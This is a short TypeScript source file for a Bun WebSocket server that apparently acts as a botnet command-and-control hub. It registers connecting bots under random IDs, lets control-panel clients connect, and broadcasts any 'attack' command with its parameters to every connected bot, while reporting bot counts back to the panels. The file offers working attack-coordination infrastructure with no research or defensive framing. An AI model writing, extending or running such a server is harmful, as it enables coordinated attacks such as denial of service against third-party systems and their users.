import { serve } from "bun";

const bots = new Map();
const clients = new Set();

const server = serve({
  port: 3000,
  fetch(req, server) {
    const url = new URL(req.url);
    const type = url.searchParams.get("type") || "bot";
    if (server.upgrade(req, { data: { type } })) {
      return;
    }
    return new Response("Bot Manager API");
  },
  websocket: {
    open(ws) {
      const type = (ws.data as any)?.type || "bot";
      if (type === "control") {
        clients.add(ws);
        console.log("Control Panel connected");
      } else {
        const botId = Math.random().toString(36).substring(7);
        ws.data = { id: botId, type: "bot", status: "active" };
        bots.set(botId, { ws, status: "active" });
        console.log(`Bot connected: ${botId}`);
        broadcastStats();
      }
    },
    message(ws, message) {
      const data = JSON.parse(message.toString());
      
      if (ws.data.type === "control") {
        if (data.command === "attack") {
          console.log(`Broadcasting attack command to ${bots.size} bots:`, data.params);
          for (const [id, bot] of bots) {
            bot.ws.send(JSON.stringify({ type: "attack", ...data.params }));
          }
        }
      } else {
        // Handle bot responses if needed
      }
    },
    close(ws) {
      if (ws.data.type === "control") {
        clients.delete(ws);
        console.log("Control Panel disconnected");
      } else {
        bots.delete(ws.data.id);
        console.log(`Bot disconnected: ${ws.data.id}`);
        broadcastStats();
      }
    },
  },
});

function broadcastStats() {
  const stats = {
    total: bots.size,
    active: Array.from(bots.values()).filter(b => b.status === "active").length,
  };
  const payload = JSON.stringify({ type: "stats", ...stats });
  for (const client of clients) {
    client.send(payload);
  }
}

console.log(`Manager listening on ${server.hostname}:${server.port}`);
